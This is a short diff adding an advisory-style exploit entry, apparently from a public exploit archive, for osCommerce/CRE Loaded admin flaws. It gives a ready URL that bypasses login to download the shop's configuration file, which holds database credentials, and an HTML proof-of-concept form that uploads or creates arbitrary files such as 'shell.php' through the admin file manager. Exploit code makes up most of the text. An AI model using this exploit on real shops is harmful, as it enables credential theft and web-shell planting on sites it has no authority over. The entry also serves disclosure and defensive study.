@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/50301/info
+
+osCommerce is prone to a remote file upload and a file disclosure vulnerability. The issues occur because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit these issues to upload a file and obtain an arbitrary file's content; other attacks are also possible. 
+
+The following URL is available for the file disclosure vulnerability:
+
+http://www.example.com/admin/shop_file_manager.php/login.php/login.php?action=download&filename=/includes/_includes_configure.php
+
+The following exploit is available for the remote file upload vulnerability: 
+
+<html><head><title> creloaded - Remote File Upload </title></head> <br><br><u>UPLOAD FILE:</u><br> <form name="file" action="https://www.example.com/admin/shop_file_manager.php/login.php?action=processuploads" method="post" enctype="multipart/form-data"> <input type="file" name="file_1"><br> <input name="submit" type="submit" value=" Upload " > </form> <br><u>CREATE FILE:</u><br> <form name="new_file" action="https://www.example.com/admin/shop_file_manager.php/login.php?action=save" method="post"> FILE NAME:<br> <input type="text" name="filename">&nbsp; (ex. shell.php)<br>FILE CONTENTS:<br> <textarea name="file_contents" wrap="soft" cols="70" rows="10">&lt;/textarea&gt; <input name="submit" type="submit" value=" Save " > </form> 
